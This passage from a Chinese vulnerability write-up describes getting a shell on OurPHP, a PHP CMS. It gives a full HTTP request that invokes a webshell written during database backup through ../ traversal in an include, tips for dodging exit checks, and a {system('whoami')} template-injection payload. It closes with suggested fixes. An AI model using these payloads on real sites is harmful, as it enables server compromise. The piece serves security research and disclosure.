不难看出，此时的`$data`可控，`$file =
"{$_POST[filename]}_pg{$_POST[page]}.php"`也是可控的，路径`$_POST[dir]`也可控，最终写文件的效果如下，

![](https://xzfile.aliyuncs.com/media/upload/picture/20230529095944-7b37e38a-fdc4-1.png)

可以看到，此时的webshell已经被顺利写入，`#`也注释掉了后面的干扰字符，它成了一个可以利用的webshell，接下来要做的就是调用它。

#### 调用webshell

上面提到，为了不触发`exit`，我们要秉持如下的原则：1、尽量少的执行SQL语句，多一次执行就多一次犯错的机会；2、尽量保证SQL语句在语法上是正确的。为了尽量少的执行SQL语句，在访问`function/backup/2023011522/index.php`进行调用webshell时，我们可以让`$_POST[db_temptable]`和`$_POST[db_safttemptable]`不为空，

先访问给我们的这个备份文件的链接，

![](./img/8607365942341855429.png)

![](./img/6037665227459322667.png)

输入密码，发送并抓包改包，修改为如下的payload，

    
    
    POST /function/backup/2023011522/index.php?&framename=main HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 159
    Origin: http://127.0.0.1
    Connection: close
    Referer: http://127.0.0.1/function/backup/2023011517/index.php?&framename=main
    Cookie: PHPSESSION=kcais6rfp5ouj448jrrnouql94; PHPSESSID=bjbqt41a1gcls71rf8q81i3lq3; introducer_userid=1; XDEBUG_SESSION=PHPSTORM
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: frame
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    
    db_pass=1&nextpgtimeout=2&db_safttemptable=1&action=%E5%AF%BC%E5%85%A5&loadpage=/../../202301151194/_pg1&cmd=print_r(scandir("../../"));&db_temptable=ourphp_ad
    

这里的`db_temptable=ourphp_ad`和webshell中的`ourphp_ad`是表名，尽量保持一致就可以（原因在下面讲到），应该可以换成别的，不是关注点。

接下来调试，先来到文件包含点，

![](./img/2611332473740500664.png)

这里虽然有个前缀`index_pg`，但是可以用`/../../`绕过，

![](./img/5614118062738323780.png)

接下来跟进`create`函数，

![](./img/8691747780939061979.png)

可以看到此时的完整的sql语句是个正常的语句，跟进这里的`query`函数，

![](./img/1229991332450253982.png)

![](./img/4317670065658960456.png)

可以看到这里的返回值是true，

![](./img/3886555852948980708.png)

也就避开了这个`exit`，接下来回到`create($table,$sql)`，

![](./img/3030597125160920129.png)

接下来`!$_POST[db_safttemptable]`是false，就不会执行后面的sql语句了，不过`$table`是我们可控的，这里就算执行应该也问题不大，不是重点不再深究。

![](./img/5959693823531384375.png)

接下来即可看到结果，

![](./img/7877264952372282926.png)

不过由于这里创建了`ourphp_ad`这个表，下一次再访问这个webshell时还会再执行一次

    
    
    CREATE TABLE `ourphp_ad` (Id_P int)

这样的话会报错，

![](./img/9210991525324453461.png)

不过我们控制了`db_temptable=ourphp_ad`和webshell中的表名`ourphp_ad`是一致的，这样一来的话，偶数次访问时就会再把`ourphp_ad`这个表给DROP，所以奇数次可以用，偶数次不能用，觉得麻烦可以直接用这个webshell再另写一个webshell即可。

#### 修复

修复有如下几个思路，

1、破坏掉对写入的webshell
的调用：在`include("index_pg$_POST[loadpage].php");`之前去除掉`$_POST[loadpage]`中的`../`。

2、阻止写入webshell，在`sqldumptable`函数中做防护，

    
    
    function sqldumptable($table,$tableid,$part=0) {
        if($part) global $lastcreate_temp,$current_size,$_POST,$db,$ourphp;
    
        //structure
        if($tableid >= intval($_POST[nextcreate]) or $part==0){
            @$query = $db -> create("SET SQL_QUOTE_SHOW_CREATE = 1",2);
            $query = $db -> create("SHOW CREATE TABLE `$table`",2);
            $row = $db -> whilego($query);
            $sql = str_replace("\n","\\n",str_replace("\"","\\\"",$row[1]));
            $sql = preg_replace("/^(CREATE\s+TABLE\s+`$table`)/mis","",$sql);
            $dumpstring = "create(\"$table\",\"$sql\");\r\n\r\n";
            $_POST[nextcreate]++;
            dealdata($dumpstring);
        }
        ...
    

去除掉`$table`变量中的双引号，在拼接处的前一行加上`$table = str_replace("\"","",$table);`。

### 后台模板getshell

这个漏洞就比较简单，简单列出，感兴趣的师傅自行尝试即可，

![](./img/3184687647709860802.png)

    
    
    {system('whoami')}

![](./img/6650132889336795025.png)

即可看到效果。

## 后记

本文中记录的最有价值的点是后台写文件getshell，数据库备份流程中存在了部分内容可控的文件，尽管写入的文件的内容受到限制不便于直接利用，也可以通过SQL注入中的思路进行绕过，最终配合文件包含实现getshell。

